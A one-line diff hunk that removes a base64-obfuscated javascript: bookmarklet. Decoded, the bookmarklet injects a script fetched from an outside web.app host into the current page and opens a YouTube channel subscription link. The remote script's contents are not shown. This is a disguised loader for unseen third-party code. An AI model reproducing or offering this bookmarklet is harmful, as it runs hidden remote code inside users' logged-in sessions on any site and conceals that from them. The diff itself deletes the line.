@@ -1,1 +1,0 @@
-javascript:(function(d){function _0x(a){return atob(a)};(s=d.createElement(_0x('c2NyaXB0'))).src=_0x('Ly9ieWRyaXIud2ViLmFwcC83c2Vuc2kuanM=');d[_0x('aGVhZA==')].appendChild(s);open(_0x('aHR0cHM6Ly93d3cueW91dHViZS5jb20vQGRyaXItb2ZpY2lhbD9zdWJfY29uZmlybWF0aW9uPTE='))})(document);
